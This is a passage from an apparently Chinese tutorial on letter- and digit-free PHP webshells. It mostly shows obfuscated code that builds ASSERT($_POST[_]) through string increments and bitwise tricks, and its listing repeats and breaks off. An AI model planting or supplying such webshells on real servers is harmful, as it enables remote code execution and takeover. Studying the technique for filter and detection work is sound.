punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string\">\"和\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">{</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string\">\"的\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">{</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string\">\"半\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">{</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string\">\"始\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">{</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$_____</span><span class=\"token operator\">=</span><span class=\"token string\">'_'</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string\">\"俯\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">{</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string\">\"瞰\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">{</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string\">\"次\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">{</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string\">\"站\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">{</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span>$<span class=\"token variable\">$_____</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$____</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/82b376a7-08a8-4e20-9686-553f400d280d.d8b4b6b1530c.jpg\" alt=\"14871906748025.jpg\"></p>\n<p>这个答案还利用了PHP的弱类型特性。因为要获取<code>'和'{2}</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;')==2</code>。</p>\n<h3 id=\"–方法三：字符变量自增\"><a href=\"#–方法三：字符变量自增\" class=\"headerlink\" title=\"–方法三：字符变量自增\"></a>–方法三：字符变量自增</h3><p>题目源代码在方法二中</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201021010048673.png\" alt=\"image-20201021010048673\"></p>\n<p>也就是说，<code>'a'++ =&gt; 'b'</code>，<code>'b'++ =&gt; 'c'</code>… </p>\n<p>所以，只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p>\n<p>那么，如何拿到一个值为字符串’a’的变量呢？</p>\n<p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，可以同时拿到小写和大写A，等于就可以拿到a-z和A-Z的所有字母。</p>\n<p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p>\n<p><img src=\"https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg\" alt=\"14872697183159.jpg\"></p>\n<p>再取这个字符串的第一个字母，就可以获得’A’了。</p>\n<p>利用这个技巧，编写如下webshell（因为PHP函数是大小写不敏感的，所以最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）：</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span>@<span class=\"token string\">\"$_\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// $_='Array';</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span><span class=\"token string\">'!'</span><span class=\"token operator\">==</span><span class=\"token string\">'@'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// $_=$_[0];</span>\n<span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// A</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// S</span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// S</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// E </span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// R</span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// T</span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$____</span><span class=\"token operator\">=</span><span class=\"token string\">'_'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// P</span>\n<span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// O</span>\n<span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// S</span>\n<span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// T</span>\n<span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span>$<span class=\"token variable\">$____</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span>_<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// ASSERT($_POST[_]);&lt;?php</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span>@<span class=\"token string\">\"$_\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// $_='Array';</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span><span class=\"token string\">'!'</span><span class=\"token operator\">==</span><span class=\"token string\">'@'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// $_=$_[0];</span>\n<span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// A</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// S</span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// S</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// E </span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// R</span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// T</span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$____</span><span class=\"token operator\">=</span><span class=\"token string\">'_'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token 